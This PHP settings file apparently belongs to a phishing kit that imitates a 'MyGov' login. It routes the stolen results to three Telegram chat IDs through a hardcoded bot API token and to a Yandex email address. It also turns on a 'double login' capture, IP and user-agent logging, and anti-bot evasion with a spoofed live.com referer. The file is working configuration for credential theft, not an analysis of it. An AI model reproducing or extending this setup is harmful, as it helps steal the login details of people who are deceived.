<?php

$chat_ids = ['1781549900', '6153611035', '759288448'];

$settings = array(
	"log_user"		=> "1",	// Log User-Agent, IP and Date
	"print_match"	=> "0",	// Print Crawler Detections 
	"debug"			=> "0",	// Print Errors
	"send_mail"		=> "1",	// Send E-Mail To Your Mail
	"save_results"	=> "1",	// Save Results 
	"telegram"		=> "1",	// Telegram Bots Receiver
	"double_login"  => "1",	// Dual Login 
	//"chat_id" => $combined_chat_ids,	// Chat ID Of You
	"bot_url"		=> "bot6343224990:AAGo-iziK5XgiMxJH1aJwQflTrX4boFkuOk",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
	"out"			=> "MyGov+login",	// Outcome Of AntiBots Forward - DONT CHANGE
	"email"			=> "cardoxx@yandexx.ru",	// Your E-Mail
);
return $settings;



?>

